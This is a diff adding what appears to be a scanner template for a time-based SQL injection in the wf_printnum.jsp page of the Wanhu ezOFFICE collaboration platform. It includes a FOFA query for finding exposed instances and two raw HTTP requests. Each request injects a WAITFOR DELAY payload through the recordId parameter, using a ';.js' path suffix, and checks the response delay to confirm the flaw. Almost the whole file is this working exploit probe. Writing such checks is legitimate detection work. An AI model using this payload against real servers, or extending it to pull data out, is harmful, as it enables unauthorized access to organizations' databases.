@@ -1,0 +1,38 @@
+## id: VEID-2024-0509
+## name: 万户ezOFFICE-wf_printnum.jsp存在SQL注入漏洞
+## author: hack007x
+## severity: high
+## tags: veid,sql,veid2024
+## description: 万户ezOFFICE-wf_printnum.jsp存在SQL延迟注入漏洞
+## fofa-query: app="万户ezOFFICE协同管理平台"
+## verification: true
+
+
+
+GET /defaultroot/platform/bpm/work_flow/operate/wf_printnum.jsp;.js?recordId=1;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+
+#@ timeout: 20
+#@ condition: and
+#@ matcher: response_time >= 5
+#@ matcher: status_code == 200
+
+
+---
+
+GET /defaultroot/platform/bpm/work_flow/operate/wf_printnum.jsp;.js?recordId=1;WAITFOR%20DELAY%20%270:0:8%27-- HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ timeout: 20
+#@ condition: and
+#@ matcher: response_time >= 8
+#@ matcher: status_code == 200
+
+
+
+
+
+# @VEIL-STAMP: 5e7d83ec75734ca2dfc7094fa16a11cdb37148787917db876f3b75a4136a27d1
